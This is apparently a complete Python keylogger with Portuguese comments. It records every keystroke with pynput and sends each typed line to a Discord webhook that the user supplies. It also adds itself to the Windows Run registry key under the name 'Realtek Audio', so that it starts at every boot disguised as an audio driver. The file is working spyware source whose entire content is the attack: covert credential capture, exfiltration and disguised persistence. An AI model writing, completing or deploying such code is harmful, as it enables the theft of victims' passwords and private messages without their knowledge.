from pynput.keyboard import Key, Listener
from discord_webhook import DiscordWebhook
import pathlib, sys
import threading, subprocess

lista = []
lista_salvar = ''

local = str(pathlib.Path().absolute())
name = sys.argv[0]

path = local+name

# Adiciona o script a pasta de inicialização do WINDOWS com o nome "Realtek Audio"
subprocess.Popen('REG ADD HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Realtek Audio\" /t REG_SZ /d \"'+path+'\" /f', shell = True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)

def on_press(msg):
    global lista,lista_salvar
    try:
        lista.append(msg.char)
    except:
        if msg == Key.enter:
            lista.append('\n')
            lista_salvar = ''.join(lista)
            lista = []

        elif msg == Key.space:
            lista.append(' ')

        elif msg == Key.backspace:
            try:
                lista.pop()
            except:
                pass

        else:
            pass

listener = Listener(on_press=on_press)
listener.start()

while True:
    if lista_salvar:
        webhook_urls = ['WEBHOOK_AQUI'] #coloque seu WEBHOOK aqui
        webhook = DiscordWebhook(url=webhook_urls, content=lista_salvar)
        response = webhook.execute()
        lista_salvar = ''

